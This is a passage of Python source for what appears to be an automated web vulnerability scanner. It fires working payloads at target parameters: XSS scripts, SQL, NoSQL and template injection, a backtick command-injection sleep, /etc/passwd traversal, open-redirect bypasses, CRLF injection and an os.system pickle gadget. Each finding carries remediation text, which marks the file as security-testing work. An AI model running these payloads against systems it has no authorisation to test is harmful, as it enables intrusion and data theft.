    for variant, decoder in (("standard", base64.b64decode), ("urlsafe", base64.urlsafe_b64decode)):
        try:
            raw = decoder(value + "=" * (-len(value) % 4))
        except Exception:
            continue
        if len(raw) >= 2 and raw[0] == 0x80 and raw[1] in (2, 3, 4, 5):
            return variant
    return None


class _HakuzaPickleSleep:
    """__reduce__ tells pickle "to reconstruct me, call this function with
    these args" — a real unpickler that doesn't restrict which callables
    it accepts (the entire vulnerability class) will genuinely execute
    os.system(...) during pickle.loads(), not just deserialize inert
    data. os.system is used specifically because it's importable in any
    Python environment the pickle gets unpickled in (the reference is
    serialized as the module+name pair 'os'/'system', re-resolved on the
    target's own side) — the exact same portability reasoning JWT forging
    elsewhere in this file relies on for hmac/hashlib."""
    def __init__(self, seconds):
        self.seconds = seconds

    def __reduce__(self):
        return (os.system, (f"sleep {self.seconds}",))


def _pickle_sleep_payload_b64(seconds, variant):
    raw = pickle.dumps(_HakuzaPickleSleep(seconds), protocol=4)
    encoder = base64.urlsafe_b64encode if variant == "urlsafe" else base64.b64encode
    return encoder(raw).decode().rstrip("=")


# ---------------------------------------------------------------------------
# Per-parameter mutation loop (steps 1-13)
# ---------------------------------------------------------------------------

def _test_param(ctx, parts, pairs, pname, baseline):
    console = ctx.console
    budget = ctx.budget
    timeout = ctx.timeout
    delay = ctx.delay
    orig_value = dict(pairs).get(pname, "")

    # --- 1. Reflection probe (XSS) ---
    xss_confirmed = False
    if budget.exhausted():
        return
    canary = f"hkz{secrets.token_hex(6)}"
    probe_value = f"<{canary}>"
    url1 = _build_url(parts, _with_param(pairs, pname, probe_value))
    resp1 = _polite_get(budget, delay, url1, timeout)
    if resp1 is not None:
        body1 = resp1.text or ""
        if canary in body1:
            if f"<{canary}>" in body1:
                # Verbatim/unescaped — escalate with a working script vector.
                script_payload = f"<script>{canary}alert(1)</script>"
                url2 = _build_url(parts, _with_param(pairs, pname, script_payload))
                resp2 = _polite_get(budget, delay, url2, timeout)
                body2 = (resp2.text if resp2 else "") or ""
                if resp2 is not None and script_payload in body2:
                    xss_confirmed = True
                    _persist(
                        ctx,
                        title=f"Reflected XSS via '{pname}' parameter",
                        severity="high",
                        category="Cross-Site Scripting (Reflected)",
                        url=url2, param=pname, payload=script_payload,
                        description=(
                            f"The '{pname}' parameter reflects attacker-controlled input verbatim, "
                            f"unescaped, into the HTML response: a unique canary was reflected with "
                            f"literal `<`/`>` characters intact, then a working <script> tag payload "
                            f"was echoed back byte-for-byte in the live mutated response."
                        ),
                        baseline_snippet=_ctx_snippet(baseline["body"], ""),
                        mutated_snippet=_ctx_snippet(body2, script_payload),
                        impact=("An attacker can execute arbitrary JavaScript in victims' browsers "
                               "in this site's security context — session hijacking, credential "
                               "theft, or full account takeover via a crafted link."),
                        remediation=("Apply context-appropriate output encoding at every reflection "
                                    "point (HTML-entity encode for HTML body context, JS-string "
                                    "encode for inline script context, etc.), and adopt a strict "
                                    "Content-Security-Policy as defense in depth."),
                    )
                else:
                    console.print(f"  [yellow]'{_rich_escape(pname)}': canary reflected unescaped "
                                 f"but the follow-up <script> payload was filtered/stripped — "
                                 f"inconclusive, needs manual confirmation.[/yellow]")
            elif re.search(r"&lt;|&gt;|&#x3c;|&#60;|&#x3e;|&#62;", body1, re.I):
                console.print(f"  [dim]'{_rich_escape(pname)}': reflected but HTML-entity-encoded "
                             f"— not directly exploitable via this vector (informational only).[/dim]")
            else:
                console.print(f"  [dim]'{_rich_escape(pname)}': canary reflected but bracket "
                             f"characters were stripped/filtered — no direct XSS signal.[/dim]")

    if budget.exhausted():
        return

    # --- 1b. HTTP Parameter Pollution — reflected-XSS bypass (only if step
    # 1's plain single-value probe did NOT already confirm) ---
    # Sends the SAME parameter name TWICE in one request — once with a
    # benign placeholder, once with a working <script> payload — in both
    # orderings, since real backends disagree about which occurrence of a
    # duplicated parameter is authoritative (PHP's $_GET uses the LAST
    # occurrence by default; many WAFs and framework-level validators only
    # ever inspect the FIRST). If a validation layer checks one occurrence
    # while the application itself renders the other, this bypasses it —
    # a classic, real HPP technique. Not a new signal: reuses the exact
    # same "genuinely executable, unescaped payload present in the live
    # response" certainty step 1 already established, just a new delivery
    # mechanism for it, which is why this only runs when the single-value
    # version didn't already find the same thing directly.
    if not xss_confirmed and not budget.exhausted():
        hpp_canary = f"hkzhpp{secrets.token_hex(6)}"
        hpp_payload = f"<script>{hpp_canary}alert(1)</script>"
        other_pairs = [(k, v) for k, v in pairs if k != pname]
        for ordering, dup_pairs in (
            ("payload occurrence first, benign second", [(pname, hpp_payload), (pname, orig_value)]),
            ("benign occurrence first, payload second", [(pname, orig_value), (pname, hpp_payload)]),
        ):
            if budget.exhausted():
                return
            url_hpp = _build_url(parts, other_pairs + dup_pairs)
            resp_hpp = _polite_get(budget, delay, url_hpp, timeout)
            body_hpp = resp_hpp.text or "" if resp_hpp is not None else ""
            if resp_hpp is not None and hpp_payload in body_hpp:
                _persist(
                    ctx,
                    title=f"Reflected XSS via HTTP Parameter Pollution on '{pname}' parameter",
                    severity="high",
                    category="Cross-Site Scripting (Reflected)",
                    url=url_hpp, param=pname, payload=hpp_payload,
                    description=(
                        f"Sending '{pname}' TWICE in the same request ({ordering}) caused a "
                        f"working <script> payload to come back unescaped in the live "
                        f"response — even though the identical payload sent as a single "
                        f"value on this parameter was not confirmed exploitable. Consistent "
                        f"with a validation or WAF layer inspecting only one occurrence of a "
                        f"duplicated parameter while the application itself uses the other "
                        f"to build the response: a classic HTTP Parameter Pollution bypass."
                    ),
                    baseline_snippet=_ctx_snippet(baseline["body"], ""),
                    mutated_snippet=_ctx_snippet(body_hpp, hpp_payload),
                    impact=("Same impact as reflected XSS — arbitrary JavaScript execution in "
                           "victims' browsers — but reached via a technique that a validation "
                           "layer checking only a single parameter occurrence would miss "
                           "entirely. The site may believe itself protected when it is not."),
                    remediation=("Reject requests containing duplicate parameter names outright "
                                "(most frameworks support a strict-parsing mode for this), or "
                                "ensure every validation layer and the application itself agree "
                                "on exactly which occurrence of a duplicated parameter is "
                                "authoritative."),
                )
                break  # one confirmed HPP bypass is enough evidence for this
                       # parameter; steps 2-12 below still need to run

    # --- 2. SQL injection — error-based ---
    sqli_confirmed = False
    err_payload = f"{orig_value}'"
    url_e = _build_url(parts, _with_param(pairs, pname, err_payload))
    resp_e = _polite_get(budget, delay, url_e, timeout)
    if resp_e is not None:
        body_e = resp_e.text or ""
        sig_hit, matched_text, vendor = None, "", None
        for pat, pat_vendor in _SQLI_ERROR_SIGNATURES:
            mm = re.search(pat, body_e, re.I)
            if mm and not re.search(pat, baseline["body"], re.I):
                sig_hit, matched_text, vendor = pat, mm.group(0), pat_vendor
                break
        status_changed = resp_e.status_code != baseline["status"]
        len_changed = abs(len(body_e) - baseline["length"]) > max(40, baseline["length"] * 0.05)
        if sig_hit and (status_changed or len_changed):
            sqli_confirmed = True

            extraction = None
            if ctx.depth == "deep" and vendor and not budget.exhausted():
                extraction = _attempt_sqli_extraction(ctx, parts, pairs, pname, orig_value, vendor)

            description = (
                f"Appending a single quote to the '{pname}' parameter produced a database "
                f"error signature ('{matched_text[:80]}') absent from 3 repeated baseline "
                f"requests (baseline status {baseline['status']}, length {baseline['length']}) "
                f"vs. the mutated response (status {resp_e.status_code}, length {len(body_e)})."
            )
            if extraction:
                description += (
                    f"\n\nData was successfully extracted via UNION-based injection to prove "
                    f"real impact, not just a signature match — see the extraction summary in "
                    f"this finding's evidence."
                )

            _persist(
                ctx,
                title=f"SQL Injection (error-based) via '{pname}' parameter",
                severity="critical",
                category="SQL Injection (Error-based)",
                url=url_e, param=pname, payload=err_payload,
                description=description,
                baseline_snippet=_ctx_snippet(baseline["body"], ""),
                mutated_snippet=_ctx_snippet(body_e, matched_text),
                impact=("Full database compromise is likely — read/write access to underlying "
                       "data, potential authentication bypass, and in some configurations OS "
                       "command execution via the DBMS."),
                remediation=("Use parameterized queries / prepared statements exclusively. Never "
                            "concatenate user input into SQL strings. Apply least-privilege DB "
                            "accounts and disable verbose DB error output in production."),
                extra_evidence=extraction,
            )

    if budget.exhausted():
        return

    # --- 3. SQL injection — boolean-based blind (only if step 2 found nothing) ---
    if not sqli_confirmed:
        val_true = f"{orig_value}' AND '1'='1"
        val_false = f"{orig_value}' AND '1'='2"
        url_t = _build_url(parts, _with_param(pairs, pname, val_true))
        resp_t = _polite_get(budget, delay, url_t, timeout)
        url_f = _build_url(parts, _with_param(pairs, pname, val_false))
        resp_f = _polite_get(budget, delay, url_f, timeout)
        if resp_t is not None and resp_f is not None:
            body_t, body_f = resp_t.text or "", resp_f.text or ""
            ratio_true = difflib.SequenceMatcher(None, baseline["body"], body_t).ratio()
            ratio_false = difflib.SequenceMatcher(None, baseline["body"], body_f).ratio()
            if ratio_true > 0.95 and ratio_false < 0.85:
                ai_result = None
                ai_rounds = 0
                if ctx.ai_enabled:
                    ai_result = _ai_escalate(ctx, "SQL Injection (boolean-based blind)", pname,
                                             url_t, val_true, baseline["body"], body_t)
                    ai_rounds += 1
                    # Optional single follow-up round (deep mode only), hard-capped at 2
                    # AI round-trips per parameter to bound cost.
                    if (ctx.depth == "deep" and ai_result and ai_result.get("next_payload")
                            and ai_rounds < 2 and not budget.exhausted()):
                        next_payload = ai_result["next_payload"]
                        url_np = _build_url(parts, _with_param(pairs, pname, next_payload))
                        resp_np = _polite_get(budget, delay, url_np, timeout)
                        if resp_np is not None:
                            ai_result_2 = _ai_escalate(ctx, "SQL Injection (boolean-based blind)",
                                                       pname, url_np, next_payload,
                                                       baseline["body"], resp_np.text or "")
                            ai_rounds += 1
                            if ai_result_2:
                                ai_result = ai_result_2

                if ai_result and ai_result.get("verdict") == "CONFIRMED":
                    _persist(
                        ctx,
                        title=f"SQL Injection (boolean-based blind) via '{pname}' parameter",
                        severity="critical",
                        category="SQL Injection (Boolean-based Blind)",
                        url=url_t, param=pname, payload=f"{val_true} / {val_false}",
                        description=(
                            f"Response similarity diverged meaningfully between a true-condition "
                            f"and false-condition boolean injection on '{pname}' (true≈baseline "
                            f"ratio={ratio_true:.2f}, false ratio={ratio_false:.2f}). Escalated to "
                            f"Claude for a human-pentester-style judgment call, which confirmed the "
                            f"pattern as a genuine boolean-based blind SQLi."
                        ),
                        baseline_snippet=_ctx_snippet(baseline["body"], ""),
                        mutated_snippet=_ctx_snippet(body_f, ""),
                        impact="Allows blind extraction of database contents one bit at a time.",
                        remediation="Use parameterized queries / prepared statements exclusively.",
                        ai_reasoning=ai_result.get("reasoning"),
                    )
                elif ai_result and ai_result.get("verdict") == "LIKELY":
                    _persist(
                        ctx,
                        title=(f"SQL Injection (boolean-based blind) via '{pname}' parameter "
                              f"(AI-assessed likely)"),
                        severity="medium",
                        category="SQL Injection (Boolean-based Blind)",
                        url=url_t, param=pname, payload=f"{val_true} / {val_false}",
                        description=(
                            f"Response similarity diverged meaningfully between a true-condition "
                            f"and false-condition boolean injection on '{pname}' (true≈baseline "
                            f"ratio={ratio_true:.2f}, false ratio={ratio_false:.2f}). Claude's "
                            f"judgment call assessed this as LIKELY rather than confirmed — treat "
                            f"as a strong lead pending manual verification."
                        ),
                        baseline_snippet=_ctx_snippet(baseline["body"], ""),
                        mutated_snippet=_ctx_snippet(body_f, ""),
                        impact="If confirmed, allows blind extraction of database contents one bit at a time.",
                        remediation="Use parameterized queries / prepared statements exclusively.",
                        ai_reasoning=ai_result.get("reasoning"),
                    )
                else:
                    _persist(
                        ctx,
                        title=(f"Potential boolean-based blind SQL Injection via '{pname}' "
                              f"parameter — needs manual confirmation"),
                        severity="medium",
                        category="SQL Injection (Boolean-based Blind)",
                        url=url_t, param=pname, payload=f"{val_true} / {val_false}",
                        description=(
                            f"Response similarity diverged meaningfully between a true-condition "
                            f"and false-condition boolean injection on '{pname}' (true≈baseline "
                            f"ratio={ratio_true:.2f}, false ratio={ratio_false:.2f}) — a classic "
                            f"boolean-based blind SQLi signature. This is a differential-analysis "
                            f"LEAD, not yet fully confirmed (AI escalation unavailable or "
                            f"inconclusive) — manual verification recommended."
                        ),
                        baseline_snippet=_ctx_snippet(baseline["body"], ""),
                        mutated_snippet=_ctx_snippet(body_f, ""),
                        impact="If confirmed, allows blind extraction of database contents one bit at a time.",
                        remediation="Use parameterized queries / prepared statements exclusively.",
                        ai_reasoning=(ai_result.get("reasoning") if ai_result else None),
                    )

    if budget.exhausted():
        return

    # --- 4. SQL/command injection — time-based (deep only, bounded 4s sleeps) ---
    if ctx.depth == "deep" and not sqli_confirmed:
        time_payloads = [
            (f"{orig_value}' AND SLEEP(4)-- -", "SQL Injection (time-based blind)", "critical"),
            (f"{orig_value}';waitfor delay '0:0:4'--", "SQL Injection (time-based blind)", "critical"),
        ]
        # Only try the shell-adjacent payload on params that look shell-shaped
        # AND where SQL-context steps above found nothing — avoids wasting the
        # 3-payload cap on an unlikely vector.
        if re.search(r"cmd|exec|ping|host", pname, re.I):
            time_payloads.append(
                (f"{orig_value}`sleep 4`", "OS Command Injection (time-based blind)", "critical")
            )
        time_payloads = time_payloads[:3]

        # Statistical gate, not a fixed ">4 seconds" rule: baseline_mean +
        # max(3*stdev, 2.5s). This is deliberate — a fixed threshold produces
        # false positives on naturally slow targets or jittery networks;
        # gating on how far the mutated timing sits outside THIS target's own
        # observed variance is a much stronger signal.
        threshold = baseline["mean_time"] + max(3 * baseline["stdev_time"], 2.5)

        for payload, label, sev in time_payloads:
            if budget.exhausted():
                break
            url_ti = _build_url(parts, _with_param(pairs, pname, payload))
            if budget.exhausted():
                break
            time.sleep(delay)
            budget.spend()
            try:
                t0 = time.monotonic()
                requests.get(url_ti, timeout=max(timeout, 9), allow_redirects=True,
                            headers=_UA_HEADERS)
                elapsed = time.monotonic() - t0
            except requests.exceptions.Timeout:
                console.print(f"  [dim]'{_rich_escape(pname)}': time-based probe timed out "
                             f"before completing — inconclusive, skipping.[/dim]")
                continue
            except Exception:
                continue

            if elapsed >= threshold:
                _persist(
                    ctx,
                    title=f"{label} via '{pname}' parameter",
                    severity=sev,
                    category=label,
                    url=url_ti, param=pname, payload=payload,
                    description=(
                        f"Injecting a payload with an explicit 4-second delay caused the response "
                        f"to take {elapsed:.2f}s, versus a statistical baseline of "
                        f"{baseline['mean_time']:.2f}s ± {baseline['stdev_time']:.2f}s (3 samples). "
                        f"Gate used: baseline_mean + max(3×stdev, 2.5s) = {threshold:.2f}s."
                    ),
                    baseline_snippet=f"baseline request times (s): {[round(t, 3) for t in baseline['times']]}",
                    mutated_snippet=f"mutated request elapsed: {elapsed:.2f}s (threshold {threshold:.2f}s)",
                    impact=("Blind time-based injection allows full data exfiltration one "
                           "bit/character at a time via a timing side channel, with no visible "
                           "output difference."),
                    remediation=("Use parameterized queries; for the command-injection case, "
                                "never pass user input to a shell — use safe subprocess APIs with "
                                "argument arrays and strict allow-listing."),
                    custom_poc_script=_gen_timing_poc(url_ti, label, threshold),
                )
                break  # one confirmed time-based signal per param is sufficient evidence

    if budget.exhausted():
        return

    # --- 5. SSTI (Jinja2/Twig-family only in v1 — could be extended to
    #     FreeMarker/Velocity/Smarty/Mako with their own expression syntax) ---
    # A static "{{7*7}}" / "49" probe is a short, common number — a price,
    # a view count, a timestamp fragment, or an ad/product ID containing
    # "49" anywhere on the page satisfies the old substring check with zero
    # relation to template evaluation, and it went straight to "critical"
    # with no ambiguity gate at all (unlike boolean-blind SQLi's equivalent
    # case just above, which escalates to AI when the signal alone isn't
    # conclusive). Two random two-digit operands make the product a
    # distinctive, run-specific number that's far less likely to already
    # be on the page by coincidence, and an unconditional "critical" is
    # rescoped to also require AI corroboration (or an honest
    # "needs manual confirmation" lead) exactly like boolean-blind SQLi.
    ssti_a = 11 + secrets.randbelow(87)  # 11..97
    ssti_b = 11 + secrets.randbelow(87)
    ssti_product = ssti_a * ssti_b
    ssti_payload = f"{{{{{ssti_a}*{ssti_b}}}}}"
    ssti_marker = str(ssti_product)
    url_s = _build_url(parts, _with_param(pairs, pname, ssti_payload))
    resp_s = _polite_get(budget, delay, url_s, timeout)
    if resp_s is not None:
        body_s = resp_s.text or ""
        if ssti_marker in body_s and ssti_marker not in baseline["body"]:
            ai_result = None
            if ctx.ai_enabled:
                ai_result = _ai_escalate(ctx, "Server-Side Template Injection", pname,
                                         url_s, ssti_payload, baseline["body"], body_s)

            if ai_result and ai_result.get("verdict") == "CONFIRMED":
                _persist(
                    ctx,
                    title=f"Server-Side Template Injection via '{pname}' parameter",
                    severity="critical",
                    category="Server-Side Template Injection",
                    url=url_s, param=pname, payload=ssti_payload,
                    description=(
                        f"Injecting the Jinja2/Twig-family expression `{ssti_payload}` into "
                        f"'{pname}' caused the evaluated literal '{ssti_marker}' to appear in the "
                        f"live response, absent from the baseline. Escalated to Claude for a "
                        f"human-pentester-style judgment call, which confirmed the template engine "
                        f"is evaluating attacker-controlled input as code."
                    ),
                    baseline_snippet=_ctx_snippet(baseline["body"], ""),
                    mutated_snippet=_ctx_snippet(body_s, ssti_marker),
                    impact="Server-side template injection frequently escalates to full remote code execution.",
                    remediation=("Never render user input as a template. Use logic-less templates or "
                                "sandboxed rendering with strict autoescaping — treat all user input "
                                "as data, never as template source."),
                    ai_reasoning=ai_result.get("reasoning"),
                )
            elif ai_result and ai_result.get("verdict") == "LIKELY":
                _persist(
                    ctx,
                    title=f"Server-Side Template Injection via '{pname}' parameter (AI-assessed likely)",
                    severity="medium",
                    category="Server-Side Template Injection",
                    url=url_s, param=pname, payload=ssti_payload,
                    description=(
                        f"Injecting `{ssti_payload}` into '{pname}' caused the evaluated literal "
                        f"'{ssti_marker}' to appear in the live response, absent from the baseline. "
                        f"Claude's judgment call assessed this as LIKELY rather than confirmed — "
                        f"treat as a strong lead pending manual verification."
                    ),
                    baseline_snippet=_ctx_snippet(baseline["body"], ""),
                    mutated_snippet=_ctx_snippet(body_s, ssti_marker),
                    impact="If confirmed, server-side template injection frequently escalates to full remote code execution.",
                    remediation=("Never render user input as a template. Use logic-less templates or "
                                "sandboxed rendering with strict autoescaping — treat all user input "
                                "as data, never as template source."),
                    ai_reasoning=ai_result.get("reasoning"),
                )
            else:
                _persist(
                    ctx,
                    title=(f"Potential Server-Side Template Injection via '{pname}' parameter "
                          f"— needs manual confirmation"),
                    severity="medium",
                    category="Server-Side Template Injection",
                    url=url_s, param=pname, payload=ssti_payload,
                    description=(
                        f"Injecting `{ssti_payload}` into '{pname}' caused the evaluated literal "
                        f"'{ssti_marker}' to appear in the live response, absent from the baseline "
                        f"— a classic SSTI signature. This is a differential-analysis LEAD, not yet "
                        f"fully confirmed (AI escalation unavailable or inconclusive) — manual "
                        f"verification recommended."
                    ),
                    baseline_snippet=_ctx_snippet(baseline["body"], ""),
                    mutated_snippet=_ctx_snippet(body_s, ssti_marker),
                    impact="If confirmed, server-side template injection frequently escalates to full remote code execution.",
                    remediation=("Never render user input as a template. Use logic-less templates or "
                                "sandboxed rendering with strict autoescaping — treat all user input "
                                "as data, never as template source."),
                    ai_reasoning=(ai_result.get("reasoning") if ai_result else None),
                )

    if budget.exhausted():
        return

    # --- 6. Path traversal (only params whose name suggests file/path context) ---
    if re.search(r"file|path|page|template|doc|include|load|dir", pname, re.I):
        for payload in ("../../../../../../../../etc/passwd",
                        "....//....//....//....//etc/passwd"):
            if budget.exhausted():
                break
            url_p = _build_url(parts, _with_param(pairs, pname, payload))
            resp_p = _polite_get(budget, delay, url_p, timeout)
            if resp_p is not None and re.search(r"root:.*:0:0:", resp_p.text or ""):
                _persist(
                    ctx,
                    title=f"Path Traversal / Local File Inclusion via '{pname}' parameter",
                    severity="high",
                    category="Path Traversal",
                    url=url_p, param=pname, payload=payload,
                    description=(
                        f"The '{pname}' parameter allows traversal outside the intended "
                        f"directory — /etc/passwd content (matching the root:...:0:0: signature) "
                        f"was returned in the live response, confirmed by direct content matching."
                    ),
                    baseline_snippet=_ctx_snippet(baseline["body"], ""),
                    mutated_snippet=_ctx_snippet(resp_p.text or "", "root:"),
                    impact=("Arbitrary file read can expose credentials, source code, and "
                           "configuration, often chaining to full compromise."),
                    remediation=("Never build filesystem paths from user input. Use an allow-list "
                                "of permitted filenames/IDs and resolve+validate the canonical path "
                                "stays within the intended base directory."),
                )
                break

    if budget.exhausted():
        return

    # --- 7. Open redirect (only params whose name suggests a redirect context) ---
    if re.search(r"redirect|url|next|return|dest|continue|goto", pname, re.I):
        canary_host = "hakuza-redirect-canary.invalid"
        # Beyond a plain absolute-URL payload, try three real, common
        # allow-list-filter bypass techniques: protocol-relative (many
        # filters gate on a literal "http"/"https" prefix and don't
        # realize "//host" is ALSO an absolute redirect target, just
        # without a scheme — the single most common real-world bypass of
        # this exact bug class), userinfo-embedded (a filter checking
        # "does this URL start with our own trusted host" is defeated by
        # putting the trusted host BEFORE an "@", since an HTTP
        # client/browser uses whatever comes AFTER the last "@" as the
        # actual authority), and a backslash variant (some browsers
        # historically normalize a leading backslash to a forward slash
        # before parsing, turning "/\host" into the same protocol-
        # relative shape). All three reuse the exact same "does the
        # real, non-followed Location header point at our attacker-
        # controlled canary host" certainty the plain payload already
        # established — more delivery mechanisms for the same signal,
        # not a new one.
        redirect_payloads = [
            f"https://{canary_host}/x",
            f"//{canary_host}/x",
            f"/\\{canary_host}/x",
            f"{parts.scheme}://{parts.netloc}@{canary_host}/x",
        ]
        for payload in redirect_payloads:
            if budget.exhausted():
                break
            url_r = _build_url(parts, _with_param(pairs, pname, payload))
            time.sleep(delay)
            budget.spend()
            try:
                resp_r = requests.get(url_r, timeout=timeout, allow_redirects=False,
                                      headers=_UA_HEADERS)
            except Exception:
                resp_r = None
            if resp_r is None:
                continue
            loc = resp_r.headers.get("Location", "")
            if _redirect_target_host(loc) == canary_host:
                is_bypass = payload != redirect_payloads[0]
                _persist(
                    ctx,
                    title=f"Open Redirect via '{pname}' parameter"
                         + (" (filter-bypass technique)" if is_bypass else ""),
                    severity="low",
                    category="Open Redirect",
                    url=url_r, param=pname, payload=payload,
                    description=(
                        f"Setting '{pname}' to {payload!r} caused a Location header "
                        f"pointing at an attacker-controlled host ({canary_host}), "
                        f"confirmed by inspecting the real (non-followed) HTTP "
                        f"response."
                        + (
                            " This specific payload is a known allow-list-filter bypass "
                            "technique, not a plain absolute URL — worth noting "
                            "specifically if this application has any redirect-target "
                            "validation at all, since that validation is being "
                            "defeated here, not simply absent."
                            if is_bypass else ""
                        )
                    ),
                    baseline_snippet="N/A (redirect-only check, no body comparison)",
                    mutated_snippet=f"Location: {loc}",
                    impact=("Enables convincing phishing redirects and can be chained with "
                           "OAuth flows for token theft."),
                    remediation=("Validate redirect targets against an allow-list of relative "
                                "paths or known-good domains — checking only for a literal "
                                "scheme prefix or a leading trusted-domain substring is not "
                                "sufficient, as this finding demonstrates; parse the target "
                                "as a URL and compare its actual resolved host, not the raw "
                                "string."),
                    custom_poc_script=_gen_header_poc(
                        url_r, "Open Redirect", {}, False, "Location", "startswith", payload,
                    ),
                )
                break

    if budget.exhausted():
        return

    # --- 8. CRLF / HTTP header injection ---
    crlf_raw_value = quote(orig_value, safe="") + "%0d%0aX-Hakuza-Crlf-Test:1"
    url_c = _build_url(parts, _with_param(pairs, pname, crlf_raw_value), raw_names={pname})
    resp_c = _polite_get(budget, delay, url_c, timeout)
    if resp_c is not None and "X-Hakuza-Crlf-Test" in resp_c.headers:
        _persist(
            ctx,
            title=f"CRLF / HTTP Header Injection via '{pname}' parameter",
            severity="medium",
            category="CRLF Injection",
            url=url_c, param=pname, payload="%0d%0aX-Hakuza-Crlf-Test:1",
            description=(
                f"Injecting a URL-encoded CRLF sequence into '{pname}' resulted in an "
                f"attacker-controlled response header ('X-Hakuza-Crlf-Test') being present in the "
                f"real, parsed HTTP response headers — confirmed by inspecting response.headers, "
                f"not the body."
            ),
            baseline_snippet=f"baseline header names: {list(baseline['headers'].keys())}",
            mutated_snippet=f"mutated header names: {list(resp_c.headers.keys())}",
            impact=("Can lead to HTTP response splitting, cache poisoning, session fixation, or "
                   "reflected XSS via header injection."),
            remediation=("Strip/reject CR and LF characters from any user input placed into a "
                        "response header. Use framework-level header-setting APIs that reject "
                        "embedded control characters."),
            custom_poc_script=_gen_header_poc(
                url_c, "CRLF Injection", {}, True, "X-Hakuza-Crlf-Test", "present", None,
            ),
        )

    if budget.exhausted():
        return

    # --- 9. NoSQL injection — MongoDB-style operator via bracket notation ---
    # Frameworks that parse query strings into nested objects (Express +
    # qs/body-parser's "extended" mode, several PHP setups) turn
    # `?user[$ne]=x` into `{user: {$ne: "x"}}`. If that lands directly in a
    # query (`db.users.findOne(req.query)`, a real and common pattern),
    # $ne/$regex/$gt operators can bypass an equality check entirely — the
    # classic NoSQLi login-bypass shape, but it can happen on any parameter
    # that reaches a Mongo-style query, not just login forms, so every
    # parameter gets tried here the same way SQLi does above.
    for op, val in (("$ne", "hakuza_nosqli_probe"), ("$regex", ".*")):
        if budget.exhausted():
            return
        new_pairs = [(k, v) for k, v in pairs if k != pname] + [(f"{pname}[{op}]", val)]
        url_n = _build_url(parts, new_pairs)
        resp_n = _polite_get(budget, delay, url_n, timeout)
        if resp_n is None:
            continue
        body_n = resp_n.text or ""
        status_changed = resp_n.status_code != baseline["status"]
        len_changed = abs(len(body_n) - baseline["length"]) > max(60, baseline["length"] * 0.08)
        if _DENIAL_PHRASE_RE.search(body_n) or not _nosqli_signal(
                baseline["body"], body_n, status_changed, len_changed):
            continue  # rejected outright, or no meaningful behavior change — not a signal

        control_url = _build_url(parts, [(k, v) for k, v in pairs if k != pname])
        if not _nosqli_control_confirms(ctx, control_url, baseline):
            continue  # simply dropping this parameter looks the same — the operator proved nothing

        ai_result = None
        if ctx.ai_enabled:
            ai_result = _ai_escalate(ctx, "NoSQL Injection (operator)", pname, url_n,
                                     f"{pname}[{op}]={val}", baseline["body"], body_n)
        reasoning = ai_result.get("reasoning") if ai_result else None
        confirmed = ai_result is not None and ai_result.get("verdict") == "CONFIRMED"
        likely = ai_result is not None and ai_result.get("verdict") == "LIKELY"
        if ai_result is not None and not (confirmed or likely):
            continue  # AI reviewed it and called it noise — trust that over our own diff

        title_suffix = "" if confirmed else " (needs manual confirmation)"
        _persist(
            ctx,
            title=f"Potential NoSQL Injection via '{pname}' parameter{title_suffix}",
            severity="high" if confirmed else "medium",
            category="NoSQL Injection",
            url=url_n, param=pname, payload=f"{pname}[{op}]={val}",
            description=(
                f"Replacing '{pname}={orig_value}' with the bracket-notation operator "
                f"'{pname}[{op}]={val}' produced a meaningfully different response "
                f"(status {baseline['status']}→{resp_n.status_code}, length "
                f"{baseline['length']}→{len(body_n)}) rather than being rejected or "
                f"ignored — consistent with the operator reaching a MongoDB-style query "
                f"unsanitized. This targets frameworks that parse query strings into "
                f"nested objects (Express/qs, several PHP setups); confirm the backend "
                f"actually uses a document database before treating this as confirmed."
            ),
            baseline_snippet=_ctx_snippet(baseline["body"], ""),
            mutated_snippet=_ctx_snippet(body_n, ""),
            impact=("NoSQL operator injection commonly bypasses authentication/authorization "
                   "checks (the classic $ne login-bypass) or widens a query far beyond its "
                   "intended scope, potentially returning other users' data."),
            remediation=("Never pass parsed query-string/body objects directly into a "
                        "database query. Validate that expected fields are the expected "
                        "primitive type (reject objects/arrays where a string is expected) "
                        "before using them in any query."),
            ai_reasoning=reasoning,
        )
        break  # one NoSQLi lead per parameter is enough signal — but unlike
               # every other early-exit in this function, this must NOT
               # return out of _test_param entirely: a parameter vulnerable
               # to both NoSQLi and stored XSS (plausible — a search/comment
               # field reflected into both a Mongo query and a later page)
               # would otherwise never get its stored-XSS check (step 10,
               # right below) run at all.

    if budget.exhausted():
        return

    # --- 10. Stored XSS: does an unescaped payload persist to a request
    # that never included it? ---
    # Every other check in this file (including step 1's reflected XSS) is
    # single-request: send a payload, look at THAT SAME response. Stored
    # XSS needs two requests — write, then a SEPARATE read that never
    # carried the payload at all — since that's the entire distinction
    # from reflected XSS: the payload outlives the request that sent it.
    # The second request reuses the parameter's ORIGINAL value (or its
    # absence), which is what makes this a real storage test rather than
    # just reflection again — if the injected script still shows up on a
    # request that only ever said orig_value, something server-side
    # persisted it.
    stored_canary = f"hkzstore{secrets.token_hex(6)}"
    stored_script = f"<script>{stored_canary}alert(1)</script>"
    url_write = _build_url(parts, _with_param(pairs, pname, stored_script))
    resp_write = _polite_get(budget, delay, url_write, timeout)
    if resp_write is not None and not budget.exhausted():
        readback_url = _build_url(parts, _with_param(pairs, pname, orig_value))
        resp_read = _polite_get(budget, delay, readback_url, timeout)
        if resp_read is not None:
            body_read = resp_read.text or ""
            if stored_script in body_read:
                _persist(
                    ctx,
                    title=f"Stored XSS via '{pname}' parameter",
                    severity="critical",
                    category="Cross-Site Scripting (Stored)",
                    url=readback_url, param=pname, payload=stored_script,
                    description=(
                        f"A working <script> payload was submitted once via '{pname}', then a "
                        f"COMPLETELY SEPARATE follow-up request — using only the parameter's "
                        f"original value ('{orig_value}'), never carrying the payload itself — "
                        f"still returned the payload verbatim, unescaped, in its response. The "
                        f"injected script outlived the request that sent it, which is the "
                        f"defining property of stored (not reflected) XSS: every visitor to "
                        f"this page is affected, not just someone who clicks a crafted link."
                    ),
                    baseline_snippet=_ctx_snippet(baseline["body"], ""),
                    mutated_snippet=_ctx_snippet(body_read, stored_script),
                    impact=("Every visitor to this page — not just a phished victim — executes "
                           "the attacker's JavaScript in this site's security context: session "
                           "hijacking, credential theft, or full account takeover at scale, with "
                           "no social engineering required after the initial injection."),
                    remediation=("Apply context-appropriate output encoding at every point stored "
                                "data is rendered, not just at input time (storage should be raw; "
                                "escaping is a rendering-time responsibility). Adopt a strict "
                                "Content-Security-Policy as defense in depth."),
                )

    if budget.exhausted():
        return

    # --- 11. SSRF (only params whose name suggests a URL-fetch context) ---
    # A structurally different bug from open redirect (step 7) even though
